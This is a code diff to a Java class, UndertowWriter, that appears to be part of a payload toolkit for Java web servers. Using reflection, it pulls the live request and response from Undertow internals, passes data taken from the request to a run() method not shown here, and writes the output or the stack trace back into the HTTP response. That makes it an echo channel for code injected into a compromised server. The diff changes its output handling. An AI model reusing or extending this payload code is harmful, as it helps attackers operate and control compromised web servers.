@@ -1,5 +1,8 @@
 package com.reajason.javaweb.probe.payload.response;
 
+import java.io.ByteArrayOutputStream;
+import java.io.OutputStream;
+import java.io.PrintStream;
 import java.io.PrintWriter;
 import java.lang.reflect.Array;
 import java.lang.reflect.Field;
@@ -31,14 +34,27 @@ public class UndertowWriter {
                     Object request = getFieldValue(value, "servletRequest");
                     Object response = getFieldValue(value, "servletResponse");
                     String data = getDataFromReq(request);
-                    PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
-                    try {
-                        writer.write(run(data));
-                    } catch (Throwable e) {
-                        e.printStackTrace(writer);
+                    if (data != null && !data.isEmpty()) {
+                        String result = "";
+                        try {
+                            result = run(data);
+                        } catch (Throwable e) {
+                            result = getErrorMessage(e);
+                        }
+                        if (result != null) {
+                            try {
+                                OutputStream outputStream = (OutputStream) invokeMethod(response, "getOutputStream", null, null);
+                                outputStream.write(result.getBytes());
+                                outputStream.flush();
+                                outputStream.close();
+                            } catch (Throwable e) {
+                                PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
+                                writer.write(result);
+                                writer.flush();
+                                writer.close();
+                            }
+                        }
                     }
-                    writer.flush();
-                    writer.close();
                     return;
                 }
             }
@@ -92,5 +108,20 @@ public class UndertowWriter {
             }
         }
         throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
     }
 }
